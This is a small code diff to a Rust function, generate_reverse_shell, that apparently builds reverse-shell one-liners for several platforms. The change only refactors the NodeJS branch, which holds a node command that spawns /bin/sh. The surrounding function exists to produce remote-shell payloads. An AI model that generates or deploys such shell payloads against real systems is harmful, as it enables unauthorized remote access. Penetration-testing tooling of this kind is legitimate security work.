@@ -60,9 +60,7 @@ pub fn generate_reverse_shell(lhost: &str, lport: u16, platform: Platform) -> St
             )
         }
         Platform::NodeJS => {
-            format!(
-                "node -e 'require(\"child_process\").spawn(\"/bin/sh\", { stdio: [0,1,2] }).on(\"error\", console.error);'",
-            )
+            "node -e 'require(\"child_process\").spawn(\"/bin/sh\", { stdio: [0,1,2] }).on(\"error\", console.error);'".to_string()
         }
         Platform::Ruby => {
             format!(
